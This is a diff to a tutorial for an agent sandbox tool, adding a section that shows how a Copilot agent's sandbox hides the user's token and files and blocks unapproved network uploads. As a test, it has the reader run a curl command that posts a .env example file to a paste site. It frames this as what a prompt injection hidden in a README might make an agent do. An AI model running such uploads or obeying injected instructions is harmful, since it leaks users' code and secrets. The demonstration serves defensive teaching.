@@ -1,4 +1,4 @@
-# 📦 Creating your first sandbox
+# 📦 Creating your agent's sandbox
 
 The `sbx create` command provisions a sandbox without attaching to it. This is useful when you want to set it up, verify that it appears in `sbx ls`, or script several sandboxes before starting any of them. `sbx run` then attaches an agent session to an existing sandbox (or creates one on the fly if it doesn't exist yet).
 
@@ -10,7 +10,7 @@ The `sbx create` command provisions a sandbox without attaching to it. This is u
     cd project
     ```
 
-2. Create your first sandbox with the `sbx create` command. `--kit` adds the Python kit you built in [Kits](02-kits.md) to the Copilot kit, and the workspace path (`.`) is the folder that gets mounted into the sandbox:
+2. Create your agent's sandbox with the `sbx create` command. `--kit` adds the Python kit you built in [Kits](02-kits.md) to the Copilot kit, and the workspace path (`.`) is the folder that gets mounted into the sandbox:
 
     ```bash
     sbx create --name quickstart --kit ./kits/python copilot .
@@ -54,7 +54,45 @@ The `sbx create` command provisions a sandbox without attaching to it. This is u
 
     A new `kit` policy applies only to `sandbox:quickstart`. Inspect it (`sbx policy inspect <POLICY>`) to see Copilot's own hosts, plus the apt and PyPI hosts your kit declared. These rules add to your **Locked Down** policy, for this sandbox only.
 
-6. With the sandbox created, start an agent in it and attach to it:
+## See the isolation for yourself
+
+Before you hand this sandbox to an agent that runs without asking for confirmation, check what it can and can't reach. `sbx exec` runs a command inside the sandbox, as the agent would.
+
+1. **Your token isn't there.** Look for it in the sandbox's environment:
+
+    ```bash
+    sbx exec quickstart sh -c 'env | grep GH_TOKEN'
+    ```
+
+    ```none
+    GH_TOKEN=gho_sbxproxymanaged000000000000000000000
+    ```
+
+    That's a placeholder. Tools in the sandbox send it as if it were a real token, and the proxy on your host swaps in your actual token on the way out, only for the GitHub and Copilot hosts. Even if the agent printed or leaked this value, it would be useless.
+
+2. **Your files aren't there, apart from the workspace.** Look at where the agent works, and at its home folder:
+
+    ```bash
+    sbx exec quickstart sh -c 'pwd; ls -A ~'
+    ```
+
+    The workspace has the same path as on your host. But the home folder is the agent's own (`/home/agent`), not yours: shell and Git settings, but no `.ssh` keys, no cloud credentials, none of your other projects.
+
+3. **It can't send your code anywhere you didn't allow.** Imagine that a malicious instruction, hidden in a README or an issue, convinced the agent to upload a file to a paste site. Try it yourself:
+
+    ```bash
+    sbx exec quickstart curl -sS -X POST --data-binary "@backend/.env.example" https://paste.rs
+    ```
+
+    The proxy answers with `Approval required for paste.rs:443.`: the upload never left your machine. Don't approve it. Find it in the sandbox's network log:
+
+    ```bash
+    sbx policy log quickstart
+    ```
+
+## Meet your agent
+
+1. With the sandbox created, start an agent in it and attach to it:
 
     ```bash
     sbx run --name quickstart
@@ -65,7 +103,7 @@ The `sbx create` command provisions a sandbox without attaching to it. This is u
     > [!IMPORTANT]
     > `--yolo` allows Copilot to run tools without individual confirmations. The sandbox limits what the agent can reach, but you should still review the agent's actions and changes.
 
-7. Ask the agent to tell you about the project:
+2. Ask the agent to tell you about the project:
 
     ```console
     Explore this codebase and give me:
